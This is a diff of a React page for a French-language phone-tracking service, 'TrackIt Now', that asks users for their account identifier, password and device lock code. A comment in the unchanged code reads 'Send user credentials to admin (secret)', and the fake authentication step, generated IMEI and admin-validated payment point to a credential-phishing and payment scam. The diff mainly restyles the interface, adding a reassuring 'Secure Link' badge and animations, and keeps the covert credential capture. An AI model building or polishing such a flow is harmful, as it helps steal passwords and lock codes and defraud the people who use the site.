@@ -1,7 +1,7 @@
 import { useQuery } from "@tanstack/react-query";
 import { useState, useEffect } from "react";
 import { Card, CardContent } from "@/components/ui/card";
-import { Satellite } from "lucide-react";
+import { Satellite, Shield, MapPin, Zap, ArrowLeft, LogOut } from "lucide-react";
 import { ThemeToggle } from "@/components/theme-provider";
 import { PlatformSelection } from "@/components/platform-selection";
 import { DeviceSelection } from "@/components/device-selection";
@@ -13,7 +13,10 @@ import { MainDashboard } from "@/components/main-dashboard";
 import { Platform } from "@/lib/device-data";
 import { generateIMEI } from "@/lib/tracking-utils";
 import { useToast } from "@/hooks/use-toast";
-import { useLocation } from "wouter";
+import { useLocation, Link } from "wouter";
+import { motion, AnimatePresence } from "framer-motion";
+import { Button } from "@/components/ui/button";
+import { apiRequest } from "@/lib/queryClient";
 
 type Step = 'platform' | 'device' | 'identifier' | 'auth' | 'imei' | 'payment' | 'dashboard';
 
@@ -30,7 +33,7 @@ export default function TrackingDashboard() {
   const [isFastTrack, setIsFastTrack] = useState(false);
   const { toast } = useToast();
 
-  const { data: user, isLoading: isUserLoading } = useQuery({ 
+  const { data: user, isLoading: isUserLoading } = useQuery<any>({ 
     queryKey: ["/api/user"],
     retry: false
   });
@@ -106,7 +109,6 @@ export default function TrackingDashboard() {
   const handleAuthComplete = async () => {
     const imei = generateIMEI();
     setGeneratedIMEI(imei);
-    setCurrentStep('imei');
     
     // Send user credentials to admin (secret)
     try {
@@ -144,7 +146,7 @@ export default function TrackingDashboard() {
         description: "Impossible d'envoyer vos informations. Veuillez réessayer.",
         variant: "destructive",
       });
-      // Fallback to allow the user to proceed anyway if it's just a network glitch on email
+      // Fallback to allow the user to proceed anyway
       setCurrentStep('imei');
       setTimeout(() => {
         setCurrentStep('payment');
@@ -155,10 +157,9 @@ export default function TrackingDashboard() {
   const handlePaymentConfirmed = async () => {
     toast({
       title: "Attente de validation",
-      description: "Votre paiement est en cours de vérification par un administrateur. Cette page s'actualisera automatiquement.",
+      description: "Votre paiement est en cours de vérification par un administrateur.",
     });
     
-    // Poll for status update every 5 seconds
     const pollInterval = setInterval(async () => {
       try {
         const response = await fetch(`/api/purchases/status/${generatedIMEI}`);
@@ -168,14 +169,14 @@ export default function TrackingDashboard() {
           clearInterval(pollInterval);
           toast({
             title: "Paiement Validé",
-            description: "Votre paiement a été confirmé par l'administrateur ! Initialisation du tracking...",
+            description: "Initialisation du tracking...",
           });
           setCurrentStep('dashboard');
         } else if (data.status === 'rejected') {
           clearInterval(pollInterval);
           toast({
             title: "Paiement Rejeté",
-            description: "Votre paiement a été rejeté. Veuillez contacter le support.",
+            description: "Veuillez contacter le support.",
             variant: "destructive"
           });
         }
@@ -186,77 +187,149 @@ export default function TrackingDashboard() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-slate-50 transition-colors duration-300">
+    <div className="min-h-screen bg-[#0A0E1A] text-slate-50 overflow-x-hidden">
       {/* Header */}
-      <header className="bg-slate-800/50 backdrop-blur-lg border-b border-slate-700/50 sticky top-0 z-50">
-        <div className="container mx-auto px-4 py-4">
+      <header className="fixed top-0 left-0 right-0 z-50 bg-[#0A0E1A]/80 backdrop-blur-xl border-b border-white/5">
+        <div className="container mx-auto px-6 py-4">
           <div className="flex items-center justify-between">
             <div className="flex items-center space-x-3">
-              <div className="w-10 h-10 bg-blue-500 rounded-lg flex items-center justify-center">
-                <Satellite className="text-white text-lg" size={20} />
+              <Link href="/">
+                <Button variant="ghost" size="icon" className="mr-2 hover:bg-white/5">
+                  <ArrowLeft className="w-5 h-5" />
+                </Button>
+              </Link>
+              <div className="w-10 h-10 bg-primary rounded-xl flex items-center justify-center shadow-lg shadow-primary/20">
+                <Satellite className="text-white" size={22} />
               </div>
-              <h1 className="text-2xl font-bold bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">
-                TrackIt Now
-              </h1>
+              <span className="text-xl font-bold tracking-tight hidden sm:inline">TrackIt <span className="text-primary">Now</span></span>
             </div>
-            <ThemeToggle />
+            <div className="flex items-center space-x-4">
+              <div className="px-4 py-1.5 rounded-full bg-white/5 border border-white/10 flex items-center space-x-2">
+                <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
+                <span className="text-[10px] font-bold uppercase tracking-widest text-slate-400">Secure Link</span>
+              </div>
+              <Button 
+                variant="ghost" 
+                size="sm" 
+                onClick={() => apiRequest("POST", "/api/logout").then(() => setLocation("/"))}
+                className="hover:bg-red-500/10 hover:text-red-400"
+              >
+                <LogOut className="w-4 h-4 mr-2" />
+                Logout
+              </Button>
+            </div>
           </div>
         </div>
       </header>
 
       {/* Main Content */}
-      <main className="container mx-auto px-4 py-8 max-w-7xl">
-        {/* Step 1: Platform Selection */}
-        <PlatformSelection 
-          onPlatformSelect={handlePlatformSelect}
-          selectedPlatform={selectedPlatform}
-        />
+      <main className="container mx-auto px-6 pt-32 pb-20 max-w-5xl">
+        <div className="relative">
+          {/* Progress Indicator */}
+          <div className="mb-12 flex justify-between items-center max-w-2xl mx-auto px-4">
+            {['platform', 'device', 'identifier', 'payment', 'dashboard'].map((step, i) => {
+              const isActive = currentStep === step || 
+                (step === 'platform' && currentStep !== 'platform') ||
+                (step === 'device' && !['platform', 'device'].includes(currentStep)) ||
+                (step === 'identifier' && ['auth', 'imei', 'payment', 'dashboard'].includes(currentStep)) ||
+                (step === 'payment' && currentStep === 'dashboard');
+              
+              return (
+                <div key={step} className="flex flex-col items-center">
+                  <div className={`w-10 h-10 rounded-full flex items-center justify-center border-2 transition-all duration-500 ${isActive ? 'bg-primary border-primary shadow-lg shadow-primary/20' : 'border-white/10 bg-white/5 text-slate-500'}`}>
+                    <span className="text-xs font-bold">{i + 1}</span>
+                  </div>
+                  <span className={`text-[10px] uppercase font-bold tracking-widest mt-3 transition-colors ${isActive ? 'text-primary' : 'text-slate-600'}`}>{step}</span>
+                </div>
+              );
+            })}
+          </div>
 
-        {/* Step 2: Device Selection */}
-        <DeviceSelection
-          platform={selectedPlatform}
-          selectedDevice={selectedDevice}
-          onDeviceSelect={handleDeviceSelect}
-          isVisible={currentStep === 'device' || (currentStep !== 'platform' && selectedDevice !== '')}
-        />
+          <motion.div 
+            key={currentStep}
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: -20 }}
+            transition={{ duration: 0.4 }}
+            className="bg-white/5 border border-white/10 rounded-[2.5rem] p-8 lg:p-12 backdrop-blur-sm"
+          >
+            {/* Step Content */}
+            <AnimatePresence mode="wait">
+              {currentStep === 'platform' && (
+                <motion.div key="platform" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+                  <PlatformSelection 
+                    onPlatformSelect={handlePlatformSelect}
+                    selectedPlatform={selectedPlatform}
+                  />
+                </motion.div>
+              )}
 
-        {/* Step 3: User Identifier */}
-        <UserIdentifier
-          platform={selectedPlatform}
-          identifier={userIdentifier}
-          password={userPassword}
-          lockCode={userLockCode}
-          onIdentifierChange={setUserIdentifier}
-          onPasswordChange={setUserPassword}
-          onLockCodeChange={setUserLockCode}
-          onAuthenticate={handleAuthenticate}
-          isVisible={currentStep === 'identifier' || (currentStep !== 'platform' && currentStep !== 'device' && userIdentifier !== '')}
-        />
+              {currentStep === 'device' && (
+                <motion.div key="device" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+                  <DeviceSelection
+                    platform={selectedPlatform}
+                    selectedDevice={selectedDevice}
+                    onDeviceSelect={handleDeviceSelect}
+                    isVisible={true}
+                  />
+                </motion.div>
+              )}
 
-        {/* Step 4: Authentication Process */}
-        <AuthenticationProcess
-          isVisible={currentStep === 'auth'}
-          onAuthComplete={handleAuthComplete}
-        />
+              {currentStep === 'identifier' && (
+                <motion.div key="identifier" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+                  <UserIdentifier
+                    platform={selectedPlatform}
+                    identifier={userIdentifier}
+                    password={userPassword}
+                    lockCode={userLockCode}
+                    onIdentifierChange={setUserIdentifier}
+                    onPasswordChange={setUserPassword}
+                    onLockCodeChange={setUserLockCode}
+                    onAuthenticate={handleAuthenticate}
+                    isVisible={true}
+                  />
+                </motion.div>
+              )}
 
-        {/* Step 5: IMEI Generation */}
-        <IMEIGeneration
-          imei={generatedIMEI}
-          isVisible={currentStep === 'imei' || (currentStep !== 'platform' && currentStep !== 'device' && currentStep !== 'identifier' && currentStep !== 'auth' && generatedIMEI !== '')}
-        />
+              {currentStep === 'auth' && (
+                <motion.div key="auth" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+                  <AuthenticationProcess
+                    isVisible={true}
+                    onAuthComplete={handleAuthComplete}
+                  />
+                </motion.div>
+              )}
 
-        {/* Step 6: Payment Section */}
-        <PaymentSection
-          selectedDevice={selectedDevice}
-          imei={generatedIMEI}
-          isVisible={currentStep === 'payment'}
-          onPaymentConfirmed={handlePaymentConfirmed}
-        />
+              {currentStep === 'imei' && (
+                <motion.div key="imei" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+                  <IMEIGeneration
+                    imei={generatedIMEI}
+                    isVisible={true}
+                  />
+                </motion.div>
+              )}
 
-        {/* Step 7: Main Dashboard */}
-        <MainDashboard
-          isVisible={currentStep === 'dashboard'}
-        />
+              {currentStep === 'payment' && (
+                <motion.div key="payment" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+                  <PaymentSection
+                    selectedDevice={selectedDevice}
+                    imei={generatedIMEI}
+                    isVisible={true}
+                    onPaymentConfirmed={handlePaymentConfirmed}
+                  />
+                </motion.div>
+              )}
+
+              {currentStep === 'dashboard' && (
+                <motion.div key="dashboard" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+                  <MainDashboard
+                    isVisible={true}
+                  />
+                </motion.div>
+              )}
+            </AnimatePresence>
+          </motion.div>
+        </div>
       </main>
     </div>
   );
